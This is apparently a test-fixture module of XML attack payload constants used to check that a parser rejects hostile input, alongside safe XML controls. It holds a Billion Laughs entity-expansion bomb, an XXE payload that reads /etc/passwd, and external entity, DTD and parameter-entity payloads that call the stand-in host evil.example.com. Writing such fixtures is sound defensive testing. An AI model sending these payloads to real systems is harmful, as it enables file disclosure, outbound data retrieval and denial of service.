"""Attack payload constants used across test modules."""

# Billion Laughs (entity expansion bomb)
BILLION_LAUGHS = """\
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<root>&lol3;</root>
"""

# Simple entity declaration
ENTITY_DECL = """\
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe "test">
]>
<foo>&xxe;</foo>
"""

# XXE external entity injection (file read)
XXE_FILE = """\
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>
"""

# XXE external entity injection (URL)
XXE_URL = """\
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://evil.example.com/data">
]>
<foo>&xxe;</foo>
"""

# DTD retrieval
DTD_EXTERNAL = """\
<?xml version="1.0"?>
<!DOCTYPE foo SYSTEM "http://evil.example.com/evil.dtd">
<foo>bar</foo>
"""

# Parameter entity
PARAMETER_ENTITY = """\
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://evil.example.com/evil.dtd">
  %xxe;
]>
<foo>bar</foo>
"""

# Safe XML (no attacks)
SAFE_XML = """\
<?xml version="1.0"?>
<root>
  <child attr="value">text</child>
  <child>more text</child>
</root>
"""

SAFE_XML_BYTES = SAFE_XML.encode("utf-8")

# Simple DTD (no entities, but has DOCTYPE)
SIMPLE_DTD = """\
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ELEMENT root (#PCDATA)>
]>
<root>hello</root>
"""
